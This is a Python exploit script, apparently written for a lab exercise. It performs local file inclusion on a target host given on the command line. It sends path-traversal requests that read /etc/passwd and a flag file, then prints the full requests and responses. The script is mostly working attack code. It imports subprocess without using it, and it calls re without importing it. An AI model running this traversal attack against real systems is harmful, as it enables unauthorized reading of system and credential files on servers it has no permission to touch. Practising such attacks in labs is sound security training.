""" 
---------------------------
Local File Inclusion (LFI)
---------------------------
"""

# Import Request to send web request to the internet
import requests
import sys
import subprocess
import base64
# Module to display output in different colors.
from colorama import Fore, Back, Style
"""
Disable the display of certificate warnings when requests 
are made to websites using insecure certificates. This can 
be useful in scenarios where targeted web applications use 
self-signed certificates as is the case in the AWAE labs.
"""
requests.packages.urllib3.\
disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
# Optional headers to mimic your Burp capture
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "*/*",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://{target}",
    "Referer": "http://{target}/",
    # don't set Content-Type here — requests will set the correct multipart boundary
}
    
def main():
    """
    Main entry point:
    - validate CLI args
    - build request info
    - simulate (or actually perform) the request
    - format and print the response blocks
    """
    # If the script is ran without specify the target
    if len(sys.argv) != 2:
        print(f"In CLI, Usage should be: {sys.argv[0]} target")
        print(f"Example: {sys.argv[0]} 10.0.0.1")
        print(f"Example: {sys.argv[0]} manageengine")
        sys.exit(1)

    # Obtain taregt from CLI
    target = sys.argv[1].strip().rstrip('/')   # from CLI202

    # ============================ TARGET URLs ============================ #
    lfi_url = f"http://{target}/index.php?language=../../../../../etc/passwd"
    # Specify Profile Images
    flag_url = f"http://{target}/index.php?language=../../../../../usr/share/flags/flag.txt"

    """
    Q1. Using the file inclusion find the name of a user on the system that starts with "b".
    """
    
    # ============================ Execute LFI TO READ /ETC/PASSWD ============================ #
    # Upload File 
    local_file_inclusion = local_file_incl(url=lfi_url)
    
    print("\n ############### Execute LFI TO READ /ETC/PASSWD ###############")
    # Display upload Response
    print_response(local_file_inclusion)

    """
    Q2. Submit the contents of the flag.txt file located in the /usr/share/flags directory.
    """

    # ============================ Retrieve FLAG FROM /USR/SHARE/FLAGS/FLAG.TXT  ============================ #
    # Upload File 
    flag = retrieve_flag(url=flag_url)
    
    print("\n ############### Retrieve FLAG FROM /USR/SHARE/FLAGS/FLAG.TXT ###############")
    # Display upload Response
    print_response(flag)


def local_file_incl(url):
    # ============================ Initiate the Request to Execute Local File Inclusion  ============================ #
    try:
        # WARNING: verify=False disables TLS certificate verification.
        r = requests.get(url, headers={"User-Agent": HEADERS["User-Agent"]}, verify=False, timeout=10)
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(2)   
    # return response to upload 
    return r

def retrieve_flag(url):
    # ============================ Initiate the Request to Get Flag ============================ #
    try:
        # WARNING: verify=False disables TLS certificate verification.
        r = requests.get(url, headers={"User-Agent": HEADERS["User-Agent"]}, verify=False, timeout=10)
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        sys.exit(2)
    # return response to with flag
    return r

def print_response_base64(response):
    resp_text = response.text  # from requests
    m = re.search(r'<svg[^>]*>(.*?)</svg>', resp_text, re.S | re.I)
    if not m:
        raise SystemExit("No <svg>...</svg> block found")

    b64 = m.group(1).strip()            # inner text
    # optional sanity check
    if not re.match(r'^[A-Za-z0-9+/=\\s]+$', b64):
        print("Warning: extracted content contains non-base64 chars; proceeding anyway")

    decoded = base64.b64decode(b64)
    print(decoded.decode('utf-8', errors='replace'))

def print_response(response):
    r = response
    # ============================ FORMAT OUTPUT ============================ #
    print("\n======= Custom Exploit Development =======\n")
    print(format_text("REQUEST METHOD:", r.request.method))
    print(format_text("REQUEST URL:", r.request.url))
    print(format_text("REQUEST HEADERS,r.headers is: :", r.request.headers))
    print(format_text("REQUEST BODY (raw):", r.request.body))   # shows form-encoded body
    print(format_text("RESPONSE STATUS,r.status_code is:", r.status_code))
    print(format_text("RESPONSE COOKIES,r.cookies is:", r.cookies))
    print(format_text("RESPONSE CONTENT-LENGTH:", len(r.text)))
    print(format_text("RESPONSE (first 300 chars):\n", r.text))

def format_text(title,item):
  """
    Helper to create a nicely formatted console output block.

    - title: short label for the section (e.g. "r.status_code is:")
    - item: item to display (will be stringified)
    Returns a string that contains the title, a separator, the item, and a short marker.
  """
  cr = '\r\n'
  section_break = cr +  "*" * 20 + cr
  item = str(item)
  text = Style.BRIGHT + Fore.RED + title + Fore.RESET + section_break + item + section_break + '\t'
  return text

if __name__ == "__main__":
    main()